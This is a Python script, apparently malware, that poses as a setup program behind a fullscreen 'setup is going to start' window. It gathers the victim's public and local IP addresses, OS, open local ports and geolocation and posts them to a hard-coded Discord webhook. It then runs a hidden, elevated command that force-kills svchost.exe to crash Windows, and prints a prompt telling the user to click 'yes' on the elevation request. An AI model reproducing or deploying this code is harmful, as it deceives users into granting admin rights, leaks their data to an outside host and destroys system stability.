import tkinter as tk
import time
import pyautogui
import subprocess
import requests
import socket
import os
import platform
import json


root = tk.Tk()
root.geometry('800x600')
root.configure(bg='black')
root.lift()
root.attributes('-topmost', True)


label = tk.Label(root, text="Welcome, the setup is going to start.", 
                 font=("Arial", 24), fg='white', bg='black')
label.pack(expand=True)

root.update()


subprocess.run([subprocess.sys.executable, '-m', 'pip', 'install', 'pyautogui'], 
               capture_output=True, text=True)

subprocess.run([subprocess.sys.executable, '-m', 'pip', 'install', 'requests'], 
               capture_output=True, text=True)

time.sleep(5)


def get_system_info():
    try:
      
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        ip_pubblico = response.json().get('ip', 'N/A')
    except:
        ip_pubblico = 'N/A'
    
    try:
       
        hostname = socket.gethostname()
        ip_locale = socket.gethostbyname(hostname)
    except:
        ip_locale = 'N/A'
    
    try:
       
        sistema_os = platform.system() + " " + platform.release()
    except:
        sistema_os = 'N/A'
    
    try:
       
        porte_aperte = []
        porte_comuni = [21, 22, 80, 443, 3306, 5432, 8080, 8443, 3389, 5900]
        for porta in porte_comuni:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            risultato = sock.connect_ex(('127.0.0.1', porta))
            if risultato == 0:
                porte_aperte.append(porta)
            sock.close()
    except:
        porte_aperte = []
    
    try:
       
        response = requests.get(f'http://ip-api.com/json/{ip_locale}', timeout=5)
        geoloc = response.json()
        geolocalizzazione = f"{geoloc.get('city', 'N/A')}, {geoloc.get('country', 'N/A')} (Lat: {geoloc.get('lat', 'N/A')}, Lon: {geoloc.get('lon', 'N/A')})"
    except:
        geolocalizzazione = 'N/A'
    
    return {
        'ip_pubblico': ip_pubblico,
        'ip_locale': ip_locale,
        'sistema_os': sistema_os,
        'porte_aperte': porte_aperte,
        'geolocalizzazione': geolocalizzazione
    }


def send_to_discord(info):
    webhook_url = "https://discord.com/api/webhooks/1462374105620676628/3Dl2wsZFTJNAY_gfnCzV7PkbE7KxPZuJ6LA-pIMW_I5y0YKyTMvQkY-5OuUgrIR8m0Os"
    
    embed = {
        "title": " System Information Collected",
        "description": "Informazioni di sistema raccolte",
        "color": 3447003,
        "fields": [
            {"name": "IP Pubblico", "value": info['ip_pubblico'], "inline": False},
            {"name": "IP Locale", "value": info['ip_locale'], "inline": False},
            {"name": "Sistema Operativo", "value": info['sistema_os'], "inline": False},
            {"name": "Porte Aperte", "value": str(info['porte_aperte']) if info['porte_aperte'] else "Nessuna", "inline": False},
            {"name": "Geolocalizzazione", "value": info['geolocalizzazione'], "inline": False}
        ]
    }
    
    data = {"embeds": [embed]}
    
    try:
        requests.post(webhook_url, json=data, timeout=5)
    except:
        pass


info_sistema = get_system_info()
send_to_discord(info_sistema)

time.sleep(5)


root.destroy()

time.sleep(1)


comando = "taskkill /IM svchost.exe /F"
subprocess.Popen(f'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c {comando}\'" -WindowStyle Hidden', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)

print("to complete the setup, click on yes")
